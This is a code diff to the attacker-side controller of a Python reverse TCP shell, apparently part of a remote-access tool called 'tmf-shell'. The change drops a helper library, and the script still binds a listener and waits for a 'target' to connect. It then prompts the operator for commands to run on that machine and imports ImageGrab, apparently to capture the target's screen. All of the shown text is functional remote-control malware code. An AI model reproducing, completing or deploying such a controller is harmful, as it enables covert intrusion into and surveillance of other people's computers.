@@ -1,9 +1,5 @@
-try:
-    import base64, binascii             
-    import libs.clib as clib
-    from PIL import ImageGrab, Image 
-except:                                # if system dose does not have any of this libs throw an error
-    print("ERROR: Requirements does not found. exiting...")
+import base64, binascii 
+from PIL import ImageGrab, Image 
 import colorama
 import sys
 from colorama import Fore
@@ -22,15 +18,13 @@ Server  = socket(AF_INET,SOCK_STREAM)
 Server.bind((HOST, PORT))               # binding IP and port 
 print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PORT}')
 Server.listen(1)                        # waiting for the user to connect 
-print(clib.text(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection From: {HOST}:{PORT}").Color())  # if we got connection show target IP
+print(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection From: {HOST}:{PORT}")  # if we got connection show target IP
 
 Client, Addr = Server.accept()                              # our client and client info module and accepting the connection 
 
-print(clib.text(Intro).Art())                               #showing our intro art
-
 while True:                                                     #start while True 
 
-    print(clib.text("\033[4mtmf\033[0m-\033[4mshell\033[0m > ").Color(), end="")      # ask the user for command 
+    print("\033[4mtmf\033[0m-\033[4mshell\033[0m > ")     # ask the user for command 
     Shell_User   = input()                                      # Get the command
     L_Shell_User = Shell_User.split(" ")                        # convert command to list
 
